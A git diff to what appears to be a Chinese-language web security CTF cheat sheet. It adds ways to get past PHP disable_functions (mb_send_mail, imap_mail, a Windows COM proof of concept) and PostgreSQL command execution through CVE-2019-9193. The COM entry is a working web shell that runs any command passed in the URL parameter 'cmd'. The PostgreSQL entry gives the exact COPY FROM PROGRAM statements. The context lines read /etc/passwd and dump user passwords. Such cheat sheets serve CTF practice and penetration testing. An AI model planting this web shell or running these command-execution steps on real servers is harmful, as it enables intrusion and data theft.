@@ -664,6 +664,13 @@ echo file_get_contents('bar/etc/passwd');
     - `sendmail`
     - putenv寫LD_PRELOAD
     - trick: [LD_PRELOAD without sendmail/getuid()](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
+
+- mb_send_mail()
+    - 跟 mail() 基本上一樣
+
+- imap_mail()
+    - 同上
+
 - imap_open()
     ```php
     <?php
@@ -726,6 +733,23 @@ echo file_get_contents('bar/etc/passwd');
     - preloading + ffi
     - e.g. [RCTF 2019 - nextphp](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp)
 - [Extension](https://github.com/w181496/FuckFastcgi)
+
+- Windows COM
+    - 條件
+        - `com.allow_dcom = true`
+        - `extension=php_com_dotnet.dll`
+    - PoC:
+
+    ```php
+    <?php
+    $command = $_GET['cmd'];
+    $wsh = new COM('WScript.shell'); // Shell.Application 也可
+    $exec = $wsh->exec("cmd /c".$command);
+    $stdout = $exec->StdOut();
+    $stroutput = $stdout->ReadAll();
+    echo $stroutput;
+    ```
+
 - [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
 
 - [JSON UAF Bypass](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
@@ -1555,6 +1579,16 @@ end
     - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
 - Dump all 
     - `array_to_string(array(select userid||':'||password from users),',')`
+- RCE
+    - CVE-2019–9193
+    - 在 9.3 版本實作了 `COPY TO/FROM PROGRAM`
+    - 版本 9.3 ~ 11.2 預設啟用
+    - 讓 super user 和任何在 `pg_read_server_files` 群組的 user 可以執行任意指令
+    - 方法
+        - `DROP TABLE IF EXISTS cmd_exec;`
+        - `CREATE TABLE cmd_exec(cmd_output text);`
+        - `COPY cmd_exec FROM PROGRAM 'id';`
+        - `SELECT * FROM cmd_exec;`
 - 其它
     - version()
     - current\_database()
